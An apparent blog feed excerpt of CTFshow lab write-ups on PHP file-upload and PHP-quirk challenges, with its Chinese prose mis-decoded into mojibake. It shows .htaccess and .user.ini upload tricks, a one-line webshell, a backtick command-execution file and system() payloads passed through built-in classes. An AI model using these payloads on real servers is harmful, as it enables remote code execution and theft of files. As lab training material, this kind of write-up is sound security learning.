</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„ä½¿ç”¨ä¹‹å‰è¦å¯¼å…¥phpçš„gdåº“<br>ç„¶åæ³¨å…¥å³å¯ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘çš„åº“æ²¡å¯¼å…¥æ˜ç™½ã€‚æ‰€ä»¥å°è¯•ä¸€ä¸‹å¯¹æ¯”æ¸²æŸ“å‰åä¸¤ä¸ªæ–‡ä»¶ã€‚å‘ç°å†…å®¹æœ‰éƒ¨åˆ†ä¸ä¼šæ”¹å˜ï¼Œå¯ä»¥åœ¨ä¸å˜å¤„æ³¨å…¥æœ¨é©¬ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688892427399-bbc837a0-d38d-4ca2-beea-d9b59d3feb7b.png" alt="image.png"><br>è¯•äº†ä¸€ä¸‹ ä¼¼ä¹ä¸å¤ªè¡Œã€‚<br>å¤ªé‡é‡çº§äº† ï¼Œä¸€ç›´æç¤ºä¸‹ä¸ä¸‹æ¥gdæ‰©å±•ã€‚<br>æ°”éº»äº†ã€‚ä¸åšäº†ã€‚</p><h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>æ£€æµ‹æ˜¯å¦ä¸ºzipï¼Œç©¿ä¸€ä¸ªzipç„¶åç›´æ¥åœ¨bpé‡Œé¢æŠ“åŒ…å³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899018551-9b58895b-38e1-4f92-831e-1d312225a70d.png" alt="image.png"></p><h1 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h1><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>ä½¿ç”¨<code>.htaccess</code>çš„ä¸€ä¸ªè¦æ±‚å°±æ˜¯ä½¿ç”¨apache<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899252427-86a535b8-9d71-4995-9c36-56b8e1ecd69e.png" alt="image.png"><br>htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚<br>æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   <span class="comment">//å°†.pngåç¼€çš„æ–‡ä»¶è§£æ æˆphp</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899639889-8d65e30b-7273-496a-82fd-4e5af74b68a3.png" alt="image.png"><br>å†ä¼ ä¸€ä¸ªjpgä¸ºåç¼€çš„ä¸€å¥è¯æœ¨é©¬ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899700671-4d857077-8ad6-4548-bc54-25ea14f1c8c6.png" alt="image.png"></p><h1 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h1><h3 id="åŸºç¡€å…æ€"><a href="#åŸºç¡€å…æ€" class="headerlink" title="åŸºç¡€å…æ€"></a>åŸºç¡€å…æ€</h3><p>è¿‡æ»¤äº†å…³é”®å­—eval system<br>å°±ç®€å•ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900322936-79959956-1bac-4480-9a63-9177fc0a01a7.png" alt="image.png"><br>ä¸Šä¼ ä¹‹åè®¿é—®å³å¯ã€‚ä½†æ˜¯æ³¨æ„ï¼Œç‚¹å‡»ä¸‹è½½ä¹‹åè·³è½¬é“¾æ¥æ˜¯é”™è¯¯çš„ã€‚æ­£ç¡®çš„è¿æ¥<code>/upload/jichumiansha.php</code><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900506632-4a8dd9e3-991c-4233-af39-1da09d8574f0.png" alt="image.png"></p><h1 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h1><h3 id="æ—¥å¿—åŒ…å«-1"><a href="#æ—¥å¿—åŒ…å«-1" class="headerlink" title="æ—¥å¿—åŒ…å«"></a>æ—¥å¿—åŒ…å«</h3><p>è¿˜æ˜¯ä¹‹å‰çš„.user.iniã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688900849727-63a7d2c3-edd5-40e0-a16d-129958b252d1.png" alt="20210423141358274.png"><br>contenttypeè¦ä¿®æ”¹æˆå¦‚å›¾çš„æ ·å¼ã€‚<br>ç„¶åå†ä¼ ä¸€ä¸ªphpæ–‡ä»¶ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901084652-94e75a15-5c22-4c8a-bafa-86907f8ffa0d.png" alt="image.png"><br>æ³¨æ„å›¾ä¸­UAï¼Œæ–‡ä»¶åï¼Œæ–‡ä»¶ç§ç±»ã€‚<br>ç„¶åå°±æ˜¯è®¿é—®1.phpäº†ã€‚<br><code>upload/1.php?2=tac ../f*</code></p><h1 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h1><h3 id="user-ini-GIF89Aæ–‡ä»¶å¤´"><a href="#user-ini-GIF89Aæ–‡ä»¶å¤´" class="headerlink" title=".user.ini GIF89Aæ–‡ä»¶å¤´"></a>.user.ini GIF89Aæ–‡ä»¶å¤´</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688901395850-cfc84364-443e-406e-bd88-c2c5572653f1.png" alt="image.png"><br>åŠ ä¸ªæ–‡ä»¶å¤´å³å¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web106-web131phpç‰¹æ€§ç¯‡ï¼ˆäºŒï¼‰</title>
      <link href="/2023/07/09/web106-web131php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/07/09/web106-web131php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">  <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•°ç»„å’Œè½¬ä¸º0eéƒ½è¡Œï¼Œè¿™é‡Œå›¾çœäº‹ä½¿ç”¨äº†æ•°ç»„ç»•è¿‡ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334208070-bcca58a3-83a4-4cb2-a742-02362c1d614a.png" alt="image.png"></p><h1 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107 parse_str"></a>web107 parse_str</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">  <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str</code>å‡½æ•°ä¼šå­˜å‚¨å€¼ä½œä¸ºå˜é‡<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334510177-e84f6494-6118-48b2-8afe-2446165f306e.png" alt="image.png"><br>å› æ­¤é¢˜ç›®çš„æ„æ€æ˜¯å°†v1ä¸­flagå€¼ä¸v3ä¸­çš„MD5å€¼ç›¸åŒï¼Œé‚£ä¹ˆï¼š<br>GETï¼š<code>?v3=hello</code><br>POSTï¼š<code>v1=flag=5d41402abc4b2a76b9719d911017c592</code></p><h1 id="web108-ereg-nullç»•è¿‡å’Œintval"><a href="#web108-ereg-nullç»•è¿‡å’Œintval" class="headerlink" title="web108 ereg nullç»•è¿‡å’Œintval"></a>web108 ereg nullç»•è¿‡å’Œintval</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ereg</code>åŒ¹é…å‡½æ•°ï¼Œé¢˜ç›®æ„æ€ä¸ºcä¸­åªèƒ½å‡ºç°å­—ç¬¦ï¼Œå‡½æ•°åœ¨NULLæˆªæ–­æ¼æ´ï¼Œ%00æˆªæ–­ç»•è¿‡<br><code>strrev</code>åè½¬å­—ç¬¦ä¸²<br>0x36då¯¹åº”çš„æ•°å€¼ä¸º877ï¼Œéœ€è¦åè½¬ä¸€æ¬¡å˜ä¸º778ã€‚<br>ç»„åˆèµ·æ¥payloadï¼š<code>a%00778</code></p><h1 id="web109-å¼‚å¸¸å¤„ç†ç±»å‘½ä»¤æ‰§è¡Œ"><a href="#web109-å¼‚å¸¸å¤„ç†ç±»å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web109 å¼‚å¸¸å¤„ç†ç±»å‘½ä»¤æ‰§è¡Œ"></a>web109 å¼‚å¸¸å¤„ç†ç±»å‘½ä»¤æ‰§è¡Œ</h1><blockquote><p>å¼‚å¸¸å¤„ç†ç±»ï¼š<a href="http://c.biancheng.net/view/6253.html">h<del>ttp://c.biancheng.net/view/6253.html</del></a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ„é€ åå°„ç±»ï¼ˆå¹¶æ²¡æœ‰æƒ³åˆ°ï¼Œåå°„ç±»è¿˜æ˜¯æ²¡æœ‰å¤ªå¼„æ‡‚ï¼‰<br><code>?v1=ReflectionClass&amp;v2=system(&quot;tac f*&quot;)</code><br>ä¹Ÿå¯ä»¥ç”¨exceptionç±»ï¼Œè¯¦æƒ…è§é¢˜ç›®ä¸‹æ–¹é“¾æ¥ã€‚<br>Exception å¼‚å¸¸å¤„ç†ç±»  payload: <code>?v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br>åŒç†ï¼š<code>?v1=mysqli&amp;v2=system(&#39;tac fl36dg.txt&#39;)</code><br>è¿™äº›éƒ½æ˜¯å› ä¸ºç±»çš„tostringé­”æœ¯æ–¹æ³•å¯¼è‡´çš„æ‰§è¡Œã€‚<br>ä¹Ÿå°±æ˜¯åˆå§‹åŒ–ä¸€ä¸ªmysqliç±»ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªç±»çš„åˆå§‹åŒ–æ—¶å€™ä¼ å‚ä¸æ­¢è¿™ä¸€ä¸ªï¼Œæ‰€ä»¥æ˜¯åˆå§‹åŒ–å¤±è´¥çš„ï¼Œä½†æ˜¯ç”±äºå…¶å†…éƒ¨æœ‰é­”æœ¯æ–¹æ³•__toStringï¼š<br>å¦‚æœç±»å®šä¹‰äº†toStringæ–¹æ³•ï¼Œå°±èƒ½åœ¨æµ‹è¯•æ—¶ï¼Œechoæ‰“å°å¯¹è±¡ä½“ï¼Œå¯¹è±¡å°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒæ‰€å±ç±»å®šä¹‰çš„toStringæ–¹æ³•ï¼Œæ ¼å¼åŒ–è¾“å‡ºè¿™ä¸ªå¯¹è±¡æ‰€åŒ…å«çš„æ•°æ®ã€‚<br>è¿™æ—¶å€™å°±å¯ä»¥echoå‡ºæ¥äº†ã€‚<br>åŒæ ·å†…éƒ¨ç±»Exceptionä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™ä¸ªç±»ä¼šæŠŠä¼ å…¥çš„å‚æ•°è¾“å‡ºå‡ºæ¥ï¼Œä¹Ÿæ˜¯ç”±__toStringæ–¹æ³•ã€‚</p><h2 id="å¤‡æ³¨ï¼š"><a href="#å¤‡æ³¨ï¼š" class="headerlink" title="å¤‡æ³¨ï¼š"></a>å¤‡æ³¨ï¼š</h2><p>åå°„ç±»è¯¦æƒ…è§web100æ–¹æ³•äºŒ</p><h1 id="web110-phpå†…ç½®ç±»-åˆ©ç”¨-FilesystemIterator-è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶"><a href="#web110-phpå†…ç½®ç±»-åˆ©ç”¨-FilesystemIterator-è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶" class="headerlink" title="web110 phpå†…ç½®ç±» åˆ©ç”¨ FilesystemIterator è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶"></a>web110 phpå†…ç½®ç±» åˆ©ç”¨ FilesystemIterator è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</h1><blockquote><p><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ FilesystemIterator è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ <a href="http://phpff.com/filesystemiterator">http://phpff.com/filesystemiterator</a> <a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a> getcwd()å‡½æ•° è·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½•<br>payloadï¼š<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h1 id="web111-å¼•ç”¨å˜é‡å’Œ-GLOBALS-æŒ‡é’ˆç›¸å…³"><a href="#web111-å¼•ç”¨å˜é‡å’Œ-GLOBALS-æŒ‡é’ˆç›¸å…³" class="headerlink" title="web111 å¼•ç”¨å˜é‡å’Œ$GLOBALS æŒ‡é’ˆç›¸å…³"></a>web111 å¼•ç”¨å˜é‡å’Œ$GLOBALS æŒ‡é’ˆç›¸å…³</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| 